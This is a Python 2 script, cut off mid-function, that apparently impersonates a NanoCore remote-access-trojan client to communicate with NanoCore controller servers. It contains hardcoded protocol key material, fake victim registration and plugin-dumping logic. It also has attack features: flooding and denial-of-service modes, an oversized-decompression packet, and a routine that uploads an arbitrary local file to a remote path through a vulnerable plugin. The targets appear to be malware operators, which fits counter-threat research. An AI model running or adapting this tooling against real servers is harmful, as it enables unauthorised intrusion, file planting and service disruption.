#!/usr/bin/env python

from Crypto.Cipher import DES
from datetime import datetime, timedelta
from getopt import GetoptError, getopt as GetOpt
from sys import argv, stderr, exit
from time import sleep
import base64
import binascii
import hashlib
import math
import md5
import random
import select
import socket
import string
import struct
import zlib

def pad_pkcs7(text, block_size=8):
    no_of_blocks = math.ceil(len(text)/float(block_size))
    pad_value = int(no_of_blocks * block_size - len(text))
    if pad_value == 0:
        return text + (chr(pad_value) * block_size)
    else:
        return text + (chr(pad_value) * pad_value)

def random_string(low, high, s = "0123456789ABCDEF"):
    ret = ''.join([random.choice(s) for _ in range(random.randint(low, high))])
    return ret

def hex_leb_128(nint):
    retvalue = ""
    binint = bin(nint)[2:]
    if len(binint) > 7:
        while len(binint) > 7:
            hstr = hex(int("1" + binint[len(binint)-7:], 2))[2:]
            retvalue += '0' * (2 - len(hstr)) + hstr
            binint = binint[:len(binint)-7]
        retvalue += '0' * (2 - len(hex(int(binint, 2))[2:])) + hex(int(binint, 2))[2:]
    else:
        hstr = hex(nint)[2:]
        retvalue += '0' * (2 - len(hstr)) + hstr
    return retvalue

def leb_128(bytestr):
    bstring = ""
    pos = 0
    flag = True
    while(flag):
        binbyte = bin(int(binascii.hexlify(bytestr[pos]), 16))[2:]
        binbyte = '0' * (8 - len(binbyte)) + binbyte
        if binbyte[0] == '1':
            bstring = binbyte[1:] + bstring
            pos += 1
        if binbyte[0] == '0':
            bstring = binbyte[1:] + bstring
            flag = False
    return bstring

md5array = [
"00000000000000000000000000000000", "UNKNOWN", 
"bdc8945f1d799c845408522e372d1dbd", "ClientPlugin.dll", 
"78f7c326ea2dbd0eb08de790d6e4bd19", "CoreClientPlugin.dll", 
"7283fa19fa6af23c6469976b67c00156", "ManagementClientPlugin.dll", 
"d9ac251618ec2f76a8fa0f6fb526fb31", "NanoCoreBase.dll", 
"689743052e3a2f5f7c31ccb0d9d55a36", "MyClientPluginNew.dll", 
"603f7ddc535d2d99f9aae77274e4cffb", "FileBrowserClient.dll", 
"2c72cad8dff49c583d870fc6282980dd", "MyClientPlugin.dll", 
"de880274dcd7ec3ebf4e61e843662be3", "MyClientPlugin.dll", 
"1c6673f6dff710edabff65cf6d805b41", "NanoProtectClient.dll", 
"189d32136482ced3d7f9743aa312ad50", "NanoCoreStressTester.dll", 
"36cf6fc7f7d048755ddeace5a0a102ed", "NetworkClientPlugin.dll", 
"39c8185da53fbe588136525f1654d8f3", "SecurityClientPlugin.dll", 
"9c8242440c47a4f1ce2e47df3c3ddd28", "SurveillanceExClientPlugin.dll", 
"5f811de9c87dff3815974880168f9f54", "SurveillanceClientPlugin.dll", 
"b7fc2e10abaeb174f02fe10f533ec741", "ToolsClientPlugin.dll", 
]

guidarray = [
"00000000000000000000000000000000", 0,
"dc6e46d44fd8d0f28dceeb4345fd8569", 4,
"9c4d558ebda2481be703c5704de5a7d8", 6,
"83a9abd088d1d9e503faea3df4ea994d", 8,
"0e9fb5e3a95d565650ca3a9c01162011", 10,
"bea1ca946d76446aa7be3d14688fc136", 12,
"2ea2db46d5b704727d2cb8de9e767095", 14,
"2df51cbb2cd8d972c2595c1cb3155589", 16,
"79cc17f63c5dc382fad63802f598a690", 18,
"f17128a488754aa2654393866f7d582d", 20,
"b92c59009ae0313d3c36119998044e3d", 22,
"8d34f55fe54b14ff57a4ee5f523ee6b3", 24,
"c7cc412421e525624a86bbbd0ea9b98f", 26,
"9c87efc05c36e4dd7b3720a8972cbbfb", 28,
"365ad0830f979066ed4b27b89b03c077", 30
]

def md5_lookup(mdhash):
    md5_index = -1
    if mdhash in md5array:
        md5_index = md5array.index(mdhash)
    else:
        md5_index = 0
    return md5_index

def guid_lookup(guid_id, mdhash = ""):
    guid_index = -1
    guid_index = guidarray.index(guid_id) if guid_id in guidarray else guidarray.append(guid_id)
    if guid_index > -1:
        if guidarray[guid_index+1] == 0 and len(mdhash) == 32:
            guidarray[guid_index+1]  = md5_lookup(mdhash)
    else:
        guidarray.append(md5_lookup(mdhash))
        return len(guidarray)-2
    return guid_index

def guid_md5(guid_id):
    return md5array[guidarray[guid_lookup(guid_id)+1]]
def guid_name(guid_id):
    return md5array[guidarray[guid_lookup(guid_id)+1]+1]
def md5_name(mdhash):
    if len(mdhash) == 32:
        return ' (' + md5array[md5_lookup(mdhash)+1] + ')'
    return ""


class init(object):
    HOST = None
    PORT = None

    LICENSEKEY = "8219831EF052"
    CRACKKEY = "zeroalcatraz"

    OUTPUTPATH = None

    LUPLOADPATH = None
    RUPLOADPATH = None
    DLLCOMMAND = None
    CHECKPWN = False

    CLIENTDOS = False
    CLIENTFLOOD = False
    ATTACKTIMER = 1
    NSOCKETS = 1

    VERBOSE = False
    SOCKET = None

    PACKET = None
    RPACKET = None
    PROTOCOLKEY = None

    PPOS = 0

    GUID = None
    SYSNAME = None
    USRNAME = None
    GROUPTAG = None
    VERISONID = None

    ACTIVESOCKETS = []
    REACTIVESOCKETS = []

    ONESECOND = 0
    MAXTIMEOUT = 15

    UPLOADVULN = False
    UPLOADBRUTE = False
    INTVULN = False


    def initialize_key(self):
        if self.PROTOCOLKEY != None:
            return
        if self.VERBOSE:
            stderr.write("Seeding DES encryption key with: %s%s \n" % (self.CRACKKEY, self.LICENSEKEY))
        h_md5 = md5.new()
        h_md5.update(self.CRACKKEY + self.LICENSEKEY)
        self.PROTOCOLKEY = binascii.unhexlify(h_md5.hexdigest()[:16])
        if self.VERBOSE:
            stderr.write("DES key seeded: %s \n" % binascii.hexlify(self.PROTOCOLKEY))

    def desolve_packet(self):
        self.initialize_key()
        h_des = DES.new(self.PROTOCOLKEY, DES.MODE_CBC, self.PROTOCOLKEY)
        if self.VERBOSE:
            stderr.write("DES encryption initialized, decrypting return packet \n")
        self.RPACKET = h_des.decrypt(self.RPACKET)
        if self.VERBOSE:
            stderr.write("DECODED: %s \n\n" % binascii.hexlify(self.RPACKET))
        if b'\x01' == self.RPACKET[0]:
            if self.VERBOSE:
                stderr.write("Deflated packet detected, inflating \n")
            try :
                self.RPACKET = zlib.decompress(self.RPACKET[5:], -15)
            except Exception:
                stderr.write("Failed to inflate packet \n")
                self.dis_connect(self.SOCKET)
            if self.VERBOSE:
                stderr.write("INFLATED: %s \n\n" % binascii.hexlify(self.RPACKET))
        else:
            if self.VERBOSE:
                stderr.write("Non-Compressed packet \n")
            self.RPACKET = self.RPACKET[1:]

    def compress_packet(self):
        self.PACKET = self.PACKET[1:]
        self.PACKET = binascii.unhexlify("01") + struct.pack('<I', len(self.PACKET)) + zlib.compress(self.PACKET)[2:-4]
    def compress_bpacket(self):
        self.PACKET = self.PACKET[1:]
        self.PACKET = binascii.unhexlify("01") + struct.pack('<I', 1024*1024*512) + zlib.compress(self.PACKET)[2:-4]

    def encapsulate_packet(self):
        self.initialize_key()
        self.PACKET = pad_pkcs7(self.PACKET)
        h_des = DES.new(self.PROTOCOLKEY, DES.MODE_CBC, self.PROTOCOLKEY)
        if self.VERBOSE:
            stderr.write("DES encryption initialized, encrypting packet \n")
        self.PACKET = struct.pack('<I', len(self.PACKET)) + h_des.encrypt(self.PACKET)
        if self.VERBOSE:
            stderr.write("SENCODED: %s \n\n" % binascii.hexlify(self.PACKET))

    def packet_ping(self):
        cpacket = binascii.unhexlify("00")
        cpacket += binascii.unhexlify("0006")
        cpacket += binascii.unhexlify("00")
        self.PACKET = cpacket

    def packet_get_plugin_guids(self):
        cpacket = binascii.unhexlify("00")
        cpacket += binascii.unhexlify("0100")
        cpacket += binascii.unhexlify("00")
        cpacket += binascii.unhexlify("0000")
        self.PACKET = cpacket

    def packet_get_clientplugins(self):
        cpacket = binascii.unhexlify("00")
        cpacket += binascii.unhexlify("0100")
        cpacket += binascii.unhexlify("00")
        cpacket += binascii.unhexlify("0001")
        self.PACKET = cpacket

    def packet_skip_plugins(self):
        cpacket = binascii.unhexlify("00")
        cpacket += binascii.unhexlify("0102")
        cpacket += binascii.unhexlify("00")
        self.PACKET = cpacket

    def packet_download_plugin(self, guid_array):
        cpacket = binascii.unhexlify("00")
        cpacket += binascii.unhexlify("0102")
        cpacket += binascii.unhexlify("00")
        i = 0
        while i < len(guid_array):
            cpacket += binascii.unhexlify("12" + guid_array[i])
            i += 1
        self.PACKET = cpacket

    def packet_end_plugins(self):
        cpacket = binascii.unhexlify("00")
        cpacket += binascii.unhexlify("0103")
        cpacket += binascii.unhexlify("00")
        self.PACKET = cpacket

    def packet_coreclient_state1(self):
        cpacket = binascii.unhexlify("00")
        cpacket += binascii.unhexlify("0004")
        cpacket += binascii.unhexlify("01")
        cpacket += binascii.unhexlify("dc6e46d44fd8d0f28dceeb4345fd8569")
        cpacket += binascii.unhexlify("0100")
        cpacket += binascii.unhexlify("0100")
        cpacket += binascii.unhexlify("0000")
        cpacket += binascii.unhexlify("0C"+hex_leb_128(len("Windows 10 Pro"))) + "Windows 10 Pro"
        cpacket += binascii.unhexlify("0140")
        cpacket += binascii.unhexlify("105ee3696a3373d948")
        cpacket += binascii.unhexlify("105ee3696a3273d948")
        cpacket += binascii.unhexlify("0C"+hex_leb_128(len("dhcpmon.exe"))) + "dhcpmon.exe"
        cpacket += binascii.unhexlify("0120")
        self.PACKET = cpacket

    def packet_coreclient_state2(self):
        cpacket = binascii.unhexlify("00")
        cpacket += binascii.unhexlify("0004")
        cpacket += binascii.unhexlify("01")
        cpacket += binascii.unhexlify("dc6e46d44fd8d0f28dceeb4345fd8569")
        cpacket += binascii.unhexlify("0100")
        cpacket += binascii.unhexlify("0101")
        cpacket += binascii.unhexlify("0106")
        cpacket += binascii.unhexlify("013a")
        cpacket += binascii.unhexlify("0700000000")
        cpacket += binascii.unhexlify("0C"+hex_leb_128(len("[explorer] Program Manager"))) + "[explorer] Program Manager"
        self.PACKET = cpacket

    def packet_survclient_state1(self):
        cpacket = binascii.unhexlify("00")
        cpacket += binascii.unhexlify("0004")
        cpacket += binascii.unhexlify("01")
        cpacket += binascii.unhexlify("c7cc412421e525624a86bbbd0ea9b98f")
        cpacket += binascii.unhexlify("0101")
        cpacket += binascii.unhexlify("0100")
        cpacket += binascii.unhexlify("0000")
        self.PACKET = cpacket

    def packet_survclient_state2(self):
        cpacket = binascii.unhexlify("00")
        cpacket += binascii.unhexlify("0004")
        cpacket += binascii.unhexlify("01")
        cpacket += binascii.unhexlify("c7cc412421e525624a86bbbd0ea9b98f")
        cpacket += binascii.unhexlify("0101")
        cpacket += binascii.unhexlify("0102")
        cpacket += binascii.unhexlify("0000")
        self.PACKET = cpacket

    def packet_secclient_state1(self):
        cpacket = binascii.unhexlify("00")
        cpacket += binascii.unhexlify("0004")
        cpacket += binascii.unhexlify("01")
        cpacket += binascii.unhexlify("8d34f55fe54b14ff57a4ee5f523ee6b3")
        cpacket += binascii.unhexlify("0100")
        cpacket += binascii.unhexlify("0100")
        cpacket += binascii.unhexlify("0C"+hex_leb_128(len("Windows Defender"))) + "Windows Defender"
        cpacket += binascii.unhexlify("0C"+hex_leb_128(len("None"))) + "None"
        cpacket += binascii.unhexlify("0C"+hex_leb_128(len("None"))) + "None"
        self.PACKET = cpacket

    def packet_upload_force(self):
        with open(self.LUPLOADPATH, "rb") as payload_file:
            payload = base64.b64encode( payload_file.read())
        cpacket = binascii.unhexlify("00")
        cpacket += binascii.unhexlify("0004")
        cpacket += binascii.unhexlify("01")
        cpacket += binascii.unhexlify("bea1ca946d76446aa7be3d14688fc136")
        cpacket += binascii.unhexlify("0105")
        cpacket += binascii.unhexlify("0C"+hex_leb_128(len(payload))) + payload
        cpacket += binascii.unhexlify("0C"+hex_leb_128(len(self.RUPLOADPATH))) + self.RUPLOADPATH
        self.PACKET = cpacket

    def packet_register_client(self):
        cpacket = binascii.unhexlify("00")
        cpacket += binascii.unhexlify("0000")
        cpacket += binascii.unhexlify("00")
        cpacket += binascii.unhexlify("12") + binascii.unhexlify(self.GUID)
        cpacket += binascii.unhexlify("0C"+hex_leb_128(len(self.SYSNAME+"\\"+self.USRNAME))) + self.SYSNAME + "\\" + self.USRNAME
        cpacket += binascii.unhexlify("0C"+hex_leb_128(len(self.GROUPTAG))) + self.GROUPTAG
        cpacket += binascii.unhexlify("0C"+hex_leb_128(len(self.VERISONID))) + self.VERISONID
        self.PACKET = cpacket

    def packet_coreclient_native(self):
        with open(self.LUPLOADPATH, "rb") as payload_file:
            payload = base64.b64encode( payload_file.read())
        cpacket = binascii.unhexlify("00")
        cpacket += binascii.unhexlify("0004")
        cpacket += binascii.unhexlify("01")
        cpacket += binascii.unhexlify("dc6e46d44fd8d0f28dceeb4345fd8569")
        cpacket += binascii.unhexlify("0100")
        cpacket += binascii.unhexlify("0102")
        cpacket += binascii.unhexlify("0C"+hex_leb_128(len(payload))) + payload
        self.PACKET = cpacket

    def packet_coreclient_blargepacket(self):
        cpacket = binascii.unhexlify("00")
        cpacket += binascii.unhexlify("0004")
        cpacket += binascii.unhexlify("01")
        cpacket += binascii.unhexlify("dc6e46d44fd8d0f28dceeb4345fd8569")
        cpacket += binascii.unhexlify("0100")
        cpacket += binascii.unhexlify("0102")
        cpacket += b'\x0C' *40
        self.PACKET = cpacket

    def body_ingestor(self, pposition):
        retvalue = None
        npos = 0
        if ( b'\x00' == self.RPACKET[pposition] ):
            print '[' + str(pposition) + '] Byte: ' + binascii.hexlify(self.RPACKET[pposition]) + binascii.hexlify(self.RPACKET[pposition+1])
            if ( b'\x00' == self.RPACKET[pposition+1] ):
                print '  BOOLEAN: ' + 'FALSE'
                npos += 1
                retvalue = False
            else:
                print '  BOOLEAN: ' + 'TRUE'
                npos += 1
                retvalue = True
        elif ( b'\x01' == self.RPACKET[pposition] ):
            print '[' + str(pposition) + '] Byte: ' + binascii.hexlify(self.RPACKET[pposition])
            print '  VALUE: ' + binascii.hexlify(self.RPACKET[pposition+1])
            npos += 1
            retvalue = binascii.hexlify(self.RPACKET[pposition+1])
        elif ( b'\x02' == self.RPACKET[pposition] ):
            print '[' + str(pposition) + '] Byte: ' + binascii.hexlify(self.RPACKET[pposition:][:4])
            isize = struct.unpack("<l", self.RPACKET[pposition+1:][:4])[0]
            print '  INT32: ' + str(isize)
            print '  BYTE[]: ' + binascii.hexlify(self.RPACKET[pposition+5:][:isize]) + md5_name(binascii.hexlify(self.RPACKET[pposition+5:][:isize]))
            npos += isize + 4
            retvalue = binascii.hexlify(self.RPACKET[pposition+5:][:isize])
        elif ( b'\x03' == self.RPACKET[pposition] ):
            print '[' + str(pposition) + '] Byte: ' + binascii.hexlify(self.RPACKET[pposition])
            print '  CHAR: ' + binascii.hexlify(self.RPACKET[pposition])
        elif ( b'\x04' == self.RPACKET[pposition] ):
            print '[' + str(pposition) + '] Byte: ' + binascii.hexlify(self.RPACKET[pposition])
            print '  CHAR[]: ' + binascii.hexlify(self.RPACKET[pposition])
        elif ( b'\x05' == self.RPACKET[pposition] ):
            print '[' + str(pposition) + '] Byte: ' + binascii.hexlify(self.RPACKET[pposition])
            print '  DECIMAL: ' + binascii.hexlify(self.RPACKET[pposition])
        elif ( b'\x06' == self.RPACKET[pposition] ):
            print '[' + str(pposition) + '] Byte: ' + binascii.hexlify(self.RPACKET[pposition])
            print '  DOUBLE: ' + binascii.hexlify(self.RPACKET[pposition])
        elif ( b'\x07' == self.RPACKET[pposition] ):
            print '[' + str(pposition) + '] Byte: ' + binascii.hexlify(self.RPACKET[pposition:][:4])
            print '  INT: ' + str(struct.unpack("<l", self.RPACKET[pposition+1:][:4])[0])
            npos += 4
            retvalue = struct.unpack("<l", self.RPACKET[pposition+1:][:4])[0]
        elif ( b'\x08' == self.RPACKET[pposition] ):
            print '[' + str(pposition) + '] Byte: ' + binascii.hexlify(self.RPACKET[pposition:][:8])
            print '  LONG: ' + str(struct.unpack("<q", self.RPACKET[pposition+1:][:8])[0])
            npos += 8
            retvalue = struct.unpack("<q", self.RPACKET[pposition+1:][:8])[0]
        elif ( b'\x09' == self.RPACKET[pposition] ):
            print '[' + str(pposition) + '] Byte: ' + binascii.hexlify(self.RPACKET[pposition])
            print '  SBYTE: ' + binascii.hexlify(self.RPACKET[pposition])
        elif ( b'\x0a' == self.RPACKET[pposition] ):
            print '[' + str(pposition) + '] Byte: ' + binascii.hexlify(self.RPACKET[pposition:][:2])
            print '  SHORT: ' + str(struct.unpack("<h", self.RPACKET[pposition+1:][:2])[0])
            npos += 2
            retvalue = struct.unpack("<h", self.RPACKET[pposition+1:][:2])[0]
        elif ( b'\x0b' == self.RPACKET[pposition] ):
            print '[' + str(pposition) + '] Byte: ' + binascii.hexlify(self.RPACKET[pposition])
            print '  FLOAT: ' + binascii.hexlify(self.RPACKET[pposition])
        elif ( b'\x0c' == self.RPACKET[pposition] ):
            bstrsize = leb_128( self.RPACKET[pposition+1:] )
            strsize = len(bstrsize)/7
            bstrint = int(bstrsize, 2)
            print '[' + str(pposition) + '] Byte: ' + binascii.hexlify(self.RPACKET[pposition:][:strsize+1])
            print '  STRING: ' + self.RPACKET[pposition+1+strsize:][:bstrint]
            npos += strsize + bstrint
            retvalue = self.RPACKET[pposition+1+strsize:][:bstrint]
        elif ( b'\x0d' == self.RPACKET[pposition] ):
            print '[' + str(pposition) + '] Byte: ' + binascii.hexlify(self.RPACKET[pposition:][:4])
            print '  UINT: ' + str(struct.unpack("<L", self.RPACKET[pposition+1:][:4])[0])
            npos += 4
            retvalue = struct.unpack("<L", self.RPACKET[pposition+1:][:4])[0]
        elif ( b'\x0e' == self.RPACKET[pposition] ):
            print '[' + str(pposition) + '] Byte: ' + binascii.hexlify(self.RPACKET[pposition:][:8])
            print '  ULONG: ' + str(struct.unpack("<Q", self.RPACKET[pposition+1:][:8])[0])
            npos += 8
            retvalue = struct.unpack("<Q", self.RPACKET[pposition+1:][:8])[0]
        elif ( b'\x0f' == self.RPACKET[pposition] ):
            print '[' + str(pposition) + '] Byte: ' + binascii.hexlify(self.RPACKET[pposition:][:2])
            print '  USHORT: ' + str(struct.unpack("<H", self.RPACKET[pposition+1:][:2])[0])
            npos += 2
            retvalue = struct.unpack("<H", self.RPACKET[pposition+1:][:2])[0]
        elif ( b'\x10' == self.RPACKET[pposition] ):
            print '[' + str(pposition) + '] Byte: ' + binascii.hexlify(self.RPACKET[pposition+1:][:8])
            time_bin = bin(struct.unpack("<Q", self.RPACKET[pposition+1:][:8])[0]  )
            print '  DATETIME: ' + str(datetime(1, 1, 1) + timedelta(seconds=( int(time_bin[:2] + time_bin[4:], 2) / 1e7 )))
            npos += 8
            retvalue = str(datetime(1, 1, 1) + timedelta(seconds=( int(time_bin[:2] + time_bin[4:], 2) / 1e7 )))
        elif ( b'\x11' == self.RPACKET[pposition] ):
            print '[' + str(pposition) + '] Byte: ' + binascii.hexlify(self.RPACKET[pposition])
            print '  STRING[]: ' + binascii.hexlify(self.RPACKET[pposition])
        elif ( b'\x12' == self.RPACKET[pposition] ):
            print '[' + str(pposition) + '] Byte: ' + binascii.hexlify(self.RPACKET[pposition])
            print '  GUID: ' + binascii.hexlify(self.RPACKET[pposition+1:][:16]) + ' (' + guid_name(binascii.hexlify(self.RPACKET[pposition+1:][:16])) + ')'
            npos += 16
            if ( b'\x02' == self.RPACKET[pposition+npos+1] ):
                if ( struct.unpack("<l", self.RPACKET[pposition+npos+1+1:][:4])[0] == 16 ):
                    guid_lookup(binascii.hexlify(self.RPACKET[pposition+1:][:16]), binascii.hexlify(self.RPACKET[pposition+npos+1+1+4:][:16]))
                    print '   MD5: ' + binascii.hexlify(self.RPACKET[pposition+npos+1+1+4:][:16]) + ' (' + guid_name(binascii.hexlify(self.RPACKET[pposition+1:][:16])) + ')'
            retvalue = binascii.hexlify(self.RPACKET[pposition+1:][:16])
        elif ( b'\x13' == self.RPACKET[pposition] ):
            print '[' + str(pposition) + '] Byte: ' + binascii.hexlify(self.RPACKET[pposition])
            print '  SIZE: ' + binascii.hexlify(self.RPACKET[pposition])
        elif ( b'\x14' == self.RPACKET[pposition] ):
            print '[' + str(pposition) + '] Byte: ' + binascii.hexlify(self.RPACKET[pposition])
            print '  RECTANGLE: ' + binascii.hexlify(self.RPACKET[pposition])
        elif ( b'\x15' == self.RPACKET[pposition] ):
            print '[' + str(pposition) + '] Byte: ' + binascii.hexlify(self.RPACKET[pposition])
            print '  VERSION: ' + binascii.hexlify(self.RPACKET[pposition])
        else:
            print '[' + str(pposition) + '] Unknown byte: ' + binascii.hexlify(self.RPACKET[pposition])
        self.PPOS += npos
        return retvalue

    def is_server_guid(self):
        if ( b'\x00' == self.RPACKET[2] ):
            return False
        else:
            print '  Header: ' + 'Server GUID: ' + binascii.hexlify(self.RPACKET[3:][:16]) + ' (' + guid_name(binascii.hexlify(self.RPACKET[3:][:16])) + ')'
            return binascii.hexlify(self.RPACKET[3:][:16])


    def h00_00(self):
        return
    def h00_01(self):
        return
    def h00_02(self):
        return

    def h00_04(self):
        if b'\x01' == self.RPACKET[2]:
            plugin_guid = self.is_server_guid()
            if plugin_guid == "dc6e46d44fd8d0f28dceeb4345fd8569":
                if ( b'\x01' == self.RPACKET[19] and b'\x00' == self.RPACKET[20] ):
                    if ( b'\x01' == self.RPACKET[21] and b'\x01' == self.RPACKET[22] ):
                        self.packet_coreclient_state2()
                if ( b'\x01' == self.RPACKET[19] and b'\x00' == self.RPACKET[20] ):
                    if ( b'\x01' == self.RPACKET[21] and b'\x00' == self.RPACKET[22] ):
                        self.packet_coreclient_state1()
            if plugin_guid == "8d34f55fe54b14ff57a4ee5f523ee6b3":
                if ( b'\x01' == self.RPACKET[19] and b'\x00' == self.RPACKET[20] ):
                    if ( b'\x01' == self.RPACKET[21] and b'\x00' == self.RPACKET[22] ):
                        self.packet_survclient_state1()
            if plugin_guid == "c7cc412421e525624a86bbbd0ea9b98f":
                if ( b'\x01' == self.RPACKET[19] and b'\x01' == self.RPACKET[20] ):
                    if ( b'\x01' == self.RPACKET[21] and b'\x00' == self.RPACKET[22] ):
                        self.packet_survclient_state2()
                if ( b'\x01' == self.RPACKET[19] and b'\x01' == self.RPACKET[20] ):
                    if ( b'\x01' == self.RPACKET[21] and b'\x02' == self.RPACKET[22] ):
                        self.packet_secclient_state1()

    def h00_06(self):
        self.packet_ping()
        return

    def h00_07(self):
        return

    def h01_00(self):
        if b'\x00' == self.RPACKET[2]:
            plugin_md5 = self.body_ingestor(3)
            if plugin_md5 == "bdc8945f1d799c845408522e372d1dbd":
                self.packet_get_plugin_guids()
            else:
                self.packet_get_clientplugins()

    def h01_01(self):
        if self.OUTPUTPATH == None:
            return
        if b'\x00' == self.RPACKET[2]:
            plugindata = self.body_ingestor(12)
            md5name  = hashlib.md5(binascii.unhexlify(plugindata)).hexdigest()
            if "UNKNOWN" in md5_name(hashlib.md5(binascii.unhexlify(plugindata)).hexdigest()):
                if self.OUTPUTPATH[len(self.OUTPUTPATH)-1] != "/":
                    self.OUTPUTPATH = self.OUTPUTPATH + "/"
                newFile = open(self.OUTPUTPATH + md5name, "wb")
                newFile.write(binascii.unhexlify(plugindata))
                newFile.close()

    def h01_02(self):
        if b'\x00' == self.RPACKET[2]:
            if self.CLIENTFLOOD and self.OUTPUTPATH == None:
                self.packet_skip_plugins()
                return
            wired = []
            i = 0
            self.RPACKET = self.RPACKET[3:]
            rlen = len(self.RPACKET)-10
            while((i*40) < rlen ):
                GUID = None
                MD5 = None
                if b'\x12' == self.RPACKET[ ( i * 40 )]:
                    GUID = self.body_ingestor((i * 40))
                if b'\x02' == self.RPACKET[ 17 + ( i * 40 )]:
                    MD5 = self.body_ingestor(17+(i * 40))
                    if "UNKNOWN" in md5_name(MD5):
                        if self.DLLCOMMAND:
                            if MD5 == "f28010f5ff8304013bf5de0409b75f4b":
                                self.INTVULN = True
                                print "  INFECTED GAME ON! "
                                if self.CHECKPWN:
                                    exit(0)
                            else:
                                print "  STATUS: MISSING " + guid_name(GUID)
                                wired.append(GUID)
                        else:
                            print "  STATUS: MISSING " + guid_name(GUID)
                            wired.append(GUID)
                    else:
                        if GUID == "bea1ca946d76446aa7be3d14688fc136":
                            self.UPLOADVULN = True
                        print "  STATUS: FOUND"
                if ( b'\x00' == self.RPACKET[ 38 + ( i * 40 )] and b'\x00' == self.RPACKET[ 39 + ( i * 40 )] ):
                    print '  STATE: WIRED'
                    wired.append(GUID)
                elif ( b'\x00' == self.RPACKET[ 38 + ( i * 40 )] and b'\x01' == self.RPACKET[ 39 + ( i * 40 )] ):
                    print '  STATE: EMBED'
                else:
                    print 'UNKNOWN'
                i += 1
            print ''
            if self.CHECKPWN:
                exit(0)
            if len(wired) > 0:
                self.packet_download_plugin(wired)

    def h01_03(self):
        if b'\x00' == self.RPACKET[2]:
            if self.OUTPUTPATH == None:
                self.packet_end_plugins()
                return
            pos = 0
            self.RPACKET = self.RPACKET[3:]
            while len(self.RPACKET) > 10:
                plugin_guid = self.body_ingestor(pos)
                if self.VERBOSE:
                    print plugin_guid
                pos += 17
                pos += 9
                pluginname = self.body_ingestor(pos)
                if self.VERBOSE:
                    print pluginname
                pos += len(pluginname)+2
                pos += 2
                plugindata = self.body_ingestor(pos)
                pos += 5
                if self.VERBOSE:
                    print plugindata
                pos += len(plugindata)/2
                self.RPACKET = self.RPACKET[pos:]
                pos = 0
                md5name  = hashlib.md5(binascii.unhexlify(plugindata)).hexdigest()
                if self.VERBOSE:
                    print md5name
                if "UNKNOWN" in md5_name(hashlib.md5(binascii.unhexlify(plugindata)).hexdigest()):
                    if self.OUTPUTPATH[len(self.OUTPUTPATH)-1] != "/":
                        self.OUTPUTPATH = self.OUTPUTPATH + "/"
                    newFile = open(self.OUTPUTPATH + md5name, "wb")
                    newFile.write(binascii.unhexlify(plugindata))
                    newFile.close()
            self.packet_end_plugins()

    def h02_00(self):
        return
    def h02_01(self):
        return
    def h02_02(self):
        return
    def h02_03(self):
        return
    def h02_04(self):
        return
    def h02_05(self):
        return


    def ingest_header(self):
        if self.VERBOSE:
            stderr.write("byte_0,byte_1: %s \n\n" % binascii.hexlify(self.RPACKET[:2]))
        if b'\x00' == self.RPACKET[0]:
            if b'\x00' == self.RPACKET[1]:
                if self.VERBOSE:
                    stderr.write("COMMAND: Register new client \n")
            elif b'\x01' == self.RPACKET[1]:
                if self.VERBOSE:
                    stderr.write("COMMAND: Change connection state \n")
                self.h00_01()
            elif b'\x02' == self.RPACKET[1]:
                if self.VERBOSE:
                    stderr.write("COMMAND: Update GUID \n")
                self.h00_02()
            elif b'\x04' == self.RPACKET[1]:
                if self.VERBOSE:
                    stderr.write("COMMAND: Select Plugin GUID \n")
                self.h00_04()
            elif b'\x06' == self.RPACKET[1]:
                if self.VERBOSE:
                    stderr.write("COMMAND: Ping \n")
                self.h00_06()
            elif b'\x07' == self.RPACKET[1]:
                if self.VERBOSE:
                    stderr.write("COMMAND: Read .dat' \n")
                self.h00_07()
            else:
                if self.VERBOSE:
                    stderr.write("UNKNOWN COMMAND: %s \n\n" % binascii.hexlify(self.RPACKET[:2]))
        elif b'\x01' == self.RPACKET[0]:
            if b'\x00' == self.RPACKET[1]:
                if self.VERBOSE:
                    stderr.write("COMMAND: Clear queue, query plugin GUID \n")
                self.h01_00()
            elif b'\x01' == self.RPACKET[1]:
                if self.VERBOSE:
                    stderr.write("COMMAND: Update client settings \n")
                self.h01_01()
            elif b'\x02' == self.RPACKET[1]:
                if self.VERBOSE:
                    stderr.write("COMMAND: Plugin Update/Remove \n")
                self.h01_02()
            elif b'\x03' == self.RPACKET[1]:
                if self.VERBOSE:
                    stderr.write("COMMAND: Install plugin \n")
                self.h01_03()
            else:
                if self.VERBOSE:
                    stderr.write("UNKNOWN COMMAND: %s \n\n" % binascii.hexlify(self.RPACKET[:2]))
        elif b'\x02' == self.RPACKET[0]:
            if b'\x00' == self.RPACKET[1]:
                if self.VERBOSE:
                    stderr.write("COMMAND: Get file details \n")
                self.h02_00()
            elif b'\x01' == self.RPACKET[1]:
                if self.VERBOSE:
                    stderr.write("COMMAND: Validate file source \n")
                self.h02_01()
            elif b'\x02' == self.RPACKET[1]:
                if self.VERBOSE:
                    stderr.write("COMMAND: Validate file block \n")
                self.h02_02()
            elif b'\x03' == self.RPACKET[1]:
                if self.VERBOSE:
                    stderr.write("COMMAND: Get file block hash \n")
                self.h02_03()
            elif b'\x04' == self.RPACKET[1]:
                if self.VERBOSE:
                    stderr.write("COMMAND: Write file to disk \n")
                self.h02_04()
            elif b'\x05' == self.RPACKET[1]:
                if self.VERBOSE:
                    stderr.write("COMMAND: Read file from disk \n")
                self.h02_05()
            else:
                if self.VERBOSE:
                    stderr.write("UNKNOWN COMMAND: %s \n\n" % binascii.hexlify(self.RPACKET[:2]))
        else:
            if self.VERBOSE:
                stderr.write("UNKNOWN COMMAND: %s \n\n" % binascii.hexlify(self.RPACKET[:2]))

    def ingestor(self):
        if self.VERBOSE:
            stderr.write("DECODING_PACKET \n\n")
        self.desolve_packet()
        if self.VERBOSE:
            stderr.write("INGESTING_PACKET \n\n")
        self.ingest_header()

    def sclose(self):
        if self.SOCKET != None:
            if self.VERBOSE:
                stderr.write("Terminating local socket \n")
            try:
                self.SOCKET.close()
                self.SOCKET = None
            except socket.error:
                stderr.write("Failed to terminate local socket \n")
        else:
            if self.VERBOSE:
                stderr.write("Socket already closed \n")

    def dis_connect(self, tsock):
        if self.VERBOSE:
            stderr.write("Closing Connection \n\n")
        retval = False
        self.RPACKET = None
        self.PACKET = None
        self.SOCKET = tsock
        self.sclose()
        try:
            self.ACTIVESOCKETS.remove(tsock)
        except Exception:
            if self.VERBOSE:
                stderr.write("Removed socket not found in ACTIVESOCKETS \n")
        try:
            self.REACTIVESOCKETS.remove(tsock)
        except Exception:
            if self.VERBOSE:
                stderr.write("Removed socket not found in REACTIVESOCKETS \n")
        return retval

    def send_packet(self):
        retry = 0
        flag = True
        while(flag):
            if retry < 0:
